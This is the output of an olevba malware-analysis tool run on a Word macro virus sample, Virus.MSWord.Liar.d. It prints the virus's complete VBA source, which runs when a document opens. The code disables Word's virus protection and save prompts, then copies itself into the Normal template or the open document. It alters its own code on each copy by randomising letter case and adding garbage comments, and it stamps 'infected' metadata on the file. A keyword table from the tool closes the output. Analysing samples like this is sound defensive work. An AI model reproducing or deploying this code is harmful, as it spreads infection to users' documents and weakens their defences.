olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Liar.d-d0f6ec4f256a5e33c17307166f709fc5f87e75d7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Liar.d-d0f6ec4f256a5e33c17307166f709fc5f87e75d7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub dOcuMeNt_oPeN() 'Á¿åä­­Å�¤éº�çÊõœ¼þÆõõ°ãûâÙá¡ž×äïï¿ÖÖ¸ßÀëíÅ÷Ò¥å±Úã¤ÀÁÕöÇº¤¬ýÉ¤Ô¼ÍÌÑÜ×å
Dim V(175): Options.VirusProtection = (Rnd * 0): Options.SaveNormalPrompt = (Rnd * 0) 'Óä¨´ä¼æ÷üß°âèÏæÝûÏë©Å´£ÞÉ÷ÀÖŸô£ÁÝñÐêœòýÝÉ£Ê×«­¼·œÞÎÖºîÕÉ®ÉÕÍéÂÏ»§ÚáâðËéÅÛ
Set A = MacroContainer.VBProject: Set Ab = A.VbcOmPOneNTs(1) 'äÜÔ¡ó¿ÝõíøÔ ÉÎžêÚØãÍòÌŸÈ¥¾Óºù´¹Îðéß±úÌ´¯ßž¯¼¥¨Öó °º×þïïÍ×õä¿
'äÜÔ¡ó¿ÝõíøÔ ÉÎžêÚØãÍòÌŸÈ¥¾Óºù´¹Îðéß±úÌ´¯ßž¯¼¥¨Öó °º×þïïÍ×õä¿
Set Abc = Ab.COdeMODUle: Set s = NormalTemplate: t = Chr(39) '°ðÄ ç¢ô�ÀÄ¥Æç©øÔ´çÚØËäÅëø¦ô¾¥è¡«ÓÎ³¬ÙìßÖðÂöëºÍíœÐÿÕã´¦­îõþðÚíž¨Å·ñæý
'°ðÄ ç¢ô�ÀÄ¥Æç©øÔ´çÚØËäÅëø¦ô¾¥è¡«ÓÎ³¬ÙìßÖðÂöëºÍíœÐÿÕã´¦­îõþðÚíž¨Å·ñæý
If MacroContainer = s Then Set s = ActiveDocument 'â¯áÚ×«×·¾× ¿ÌéÅµÒ¥ã½¦ãÛþâ�³ÅÃåÍ°ªöÉÖøÒºÎ×¡�ÄÊÂ÷íãþðÕÉÈ±û×úàÃÌÄß¥²ÆÔ¶
'â¯áÚ×«×·¾× ¿ÌéÅµÒ¥ã½¦ãÛþâ�³ÅÃåÍ°ªöÉÖøÒºÎ×¡�ÄÊÂ÷íãþðÕÉÈ±û×úàÃÌÄß¥²ÆÔ¶
Set Nh = s.VBProject.VbcOmPOneNTs(1).COdeMODUle: lI = Abc.countOflInEs: Y = 100 + Int(Rnd * 50) 'á­¸¦éÜÈÜëÆÁòùÀ¬¿ÕíÎž³ÙÏÉ¼ü¿¦ÝôÕ²ÜÖµÔ¸Íîä÷žãÂáªà°îáøÎÒÄüàòß³
For I = 1 To lI: Jc = "": D = Int(Rnd * 3): P = InStr(Abc.lIneS(I, 1), t) '¹ÔÕÞ¹êû§ûÒ¶´­ëÑ©­ÖÑÝç¯ÉÊÁ÷¸æúäŸß¿ÛÛßêêÕÂç»ÅÃøûðçØÅã¬¦ËÙÿæï¿�àç
If P = 1 And lI > Y Then 'Ô¬ê¶¦ê�Ÿ¨Ë¾Òð¿ÂªÛúÍúÚÒâŸþ¾ÂÊý¸à�âÛßÜèÄ¹åÆÆœ¢ç®³×ÁÎÎòŸîÅ»õ¾
'Ô¬ê¶¦ê�Ÿ¨Ë¾Òð¿ÂªÛúÍúÚÒâŸþ¾ÂÊý¸à�âÛßÜèÄ¹åÆÆœ¢ç®³×ÁÎÎòŸîÅ»õ¾
D = 1: GoTo n_ 'ôñàœÃäÖÐùÒÔ¡äîÍÝÌØæù¿ÛÉ§ÕÄÙúõññ³åòûº«Ì¯�ËùÁßä»×Ùë¨ð×ÃÉ·óßÿ±£âé íÖÛ
'ôñàœÃäÖÐùÒÔ¡äîÍÝÌØæù¿ÛÉ§ÕÄÙúõññ³åòûº«Ì¯�ËùÁßä»×Ùë¨ð×ÃÉ·óßÿ±£âé íÖÛ
End If '°¸ç¡Ñ·ØèÃÈÑ¿³ùðõúÉ éÝ¦Ïè«ùòŸ¬­œè½ÁžÕú¨ïçÃÛË¤É ³×´ÆÓûüÛÖÛÀîÔðžäú¯¸æ°¨�äÑ¤£Í
L = UCase(Left(Abc.lIneS(I, 1), (P - 1))) '©ÙŸÍ�Ó²áø¨Æ©¯³£ú­éäú¥�åÊÝêëóÃÅª÷ëÀÑã¬ážØ°¯ÃÜÅ½Åú«úðàÔÕªú¦
'©ÙŸÍ�Ó²áø¨Æ©¯³£ú­éäú¥�åÊÝêëóÃÅª÷ëÀÑã¬ážØ°¯ÃÜÅ½Åú«úðàÔÕªú¦
For o = 1 To Len(L): f = Mid(L, o, 1) '¦Î×¢æÈû®ÑÉÚñ¶éêßÕµôÔ­Æ³âøÁÍ»ÜÀï¥Û®ïÎüµ«âÕÌÿ½žö±ûŸœ»»îîŸº§óðåüß¥è¹¬÷®®ëõÁøÁ
If Asc(f) < 90 And Asc(f) > 65 Then f = Chr(Asc(f) + Int(Rnd * 2) * 32) '¬Þð¥Ì±ÂÝŸÚáê²¦ô¥Á¦´ßÊ­ð°ÕÉøú¬�þ¾ óÙÎ¥ï­¾éû¤Î¼ùþ ë¦Óïã´ªæÝ©ªÖÄí¡æþ
V(I) = V(I) & f: Next o '¾¥äæ²´ÙðÆóäª½ÑÇèþæ úª÷·å¤úÄÎ¨Ó¬­øÅÍ°Ôžñ¼º¶Î�ªî½ä¨¶ØöÂõ¼á÷ÀÉÆ«¢êñ¸®ß«²ÙÅ
For J = 1 To Int(75 - (Rnd * 20)): Jc = Jc & Chr(255 - Int(Rnd * 100)): Next J '±Ñóìçœþß¸ãàñßÐ£ü³øÁ»²×´î¢ßùâ¿ï¨ïÔ£Ñ�Ô³¸ëï½�²ÇÙä³èºÃí ®½ùÑ
V(I) = V(I) & t & Jc 'ãÂÛÉÀ¾ð»¡²¡ñá·æ  «¥í£ô°·¢Ò¥ïÎÚÄüÝ·øèù¬ë²ž°Ï»ä÷ÞçÔÞ¿Õ«ÑÓÁ¼œüÉúÂïÎÓ�Ä´
If D = 2 Then V(I) = V(I) & vbCr & t & Jc '¾û¨úÏÐõöÛúŸœÆÿÂµÙÇï½êÄªÈŸÚÁò¶¸¨®½äÒÄøô¡æ¨Æì©êáûÓßÁÚ¢¶ùÝÙÆç¢Öã£¹¢Ïß¯ùö¹ê
Vc = Vc & V(I) & vbCr 'ÄÞÈý¨ÓÇïíÃùœ¢§ª¡Ù«ÙÒ«­ÁÖò½òÿáÅÝ¼ÉãêÔÔÛ�ÞÛžâåè½Ë¢ÒÅàî÷®ÑÒÝ
n_: 'äÑÞ«¹§ëôÑóðÎ¬»²úèÄ�±îÃ¾£ÍËÙÏ®¥ÁŸñ¦¡Ùž×»ÆÙÎµ¼Ëÿ¿§ÞÒ¥ËÑíÇèÌµúÈÓÌæ
Next I '¯ÜÆæØ§ßé÷á¡ü£ìéÂìÁÍçô»ðïýîéÏ¾¶Ñß¶œÑì²íðÁé¬Ðõ¸­Üïº¿¦®é¦¬ò÷÷çéøÄÎâÃþÒ÷ÊÅ¤Ï
If Nh.countOflInEs < (1 + 1 + 2) Then 'åàÄ ¡¸ÞôÍ÷ãÝ¤ªêøÛ³Ÿ¿Ðåè·µï¹ñäÏá§¼¾ªÞÝ©­­«¸ÍÙ¿õè²ùÚü¹Ï¸Ó
Nh.delETElINES 1, Nh.countOflInEs: Nh.ADDFRoMStriNG Vc: Nh.delETElINES Nh.countOflInEs, 1 'ñ®Ò±ÐøèýåÚÊ­ùº»çÑ²¬¦ÒæÝ³ªîÖàî¾ÿ´Ìª£¼ íäªŸµùÞèüö´¼¥ò¤½±çÁÅùÎ±Å¦®ºÆùôÂÊé¶½�Ù
With Dialogs(wdDialogFileSummaryInfo): .Author = "InsPECTor KLAusi": .Title = "iNFeCtED WITh clAss97MACro.klAusI": .Execute: End With 'äÅ©ôþÎ¤´©­ËØ­¾éŸÞ½®ÀçÖÚ¶¨�Ë Ò´¡®´ÐðÜž¿Ï÷«ûØëôÄžúø×¼¯ÉóÛ× ÌÄ¯³äùÕøõÒ±ÆøÖÇÂî
If ActiveDocument.Saved = (Rnd * 0) Then ActiveDocument.SaveAs ActiveDocument.FullName 'ßÓÊßÎãìøß«Â´¼©¿¾æÏ¢Âó©û°Üô·¹œÙÇÓäàµçúÂïçÊÿ´Òëßúøú£ûžþÞêÏ¾ò¥×ï÷§çÊÊï°œ
'ßÓÊßÎãìøß«Â´¼©¿¾æÏ¢Âó©û°Üô·¹œÙÇÓäàµçúÂïçÊÿ´Òëßúøú£ûžþÞêÏ¾ò¥×ï÷§çÊÊï°œ
End If '�ßø¥©ÃºŸèú¤«í¸½ÁýŸ¥èÎ¨Òœé¨õÜÓÂ¢¥¦ð¨»÷áËÀ¹ââÖÜÀ¾ØÐà´¢Çóæ¨¾ÝÙÝ Áã¸ªöÅ¢ô¯ê
End Sub '´ÖÖÂ¨ïùçÐí²÷Þ¸ñÜÁ²ÕÙìÚ§Ö÷�Ò¶ãêÂŸ·²ÉÀÄ»Ïù­·ÕÜ©ó ¯½ÉÕÖÿåÞ²¡Â ö¿¶çÅ
'´ÖÖÂ¨ïùçÐí²÷Þ¸ñÜÁ²ÕÙìÚ§Ö÷�Ò¶ãêÂŸ·²ÉÀÄ»Ïù­·ÕÜ©ó ¯½ÉÕÖÿåÞ²¡Â ö¿¶çÅ
Rem coDEd By INspEcTOr kLAusi 'ö²ÝÍÞøÀÞþ²Ðóª¬¦ÓËçÀËÆÔåâÇ®ÜÉÔÄøÙï¥¦¡½ùÀÝ£ê¹©Ú÷½ÓÉï¡Þ ¢¨÷åÎž³¾ÙÖÞÓ½«ÑüèÚÙ
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |dOcuMeNt_oPeN       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VbcOmPOneNTs        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|COdeMODUle          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|ADDFRoMStriNG       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

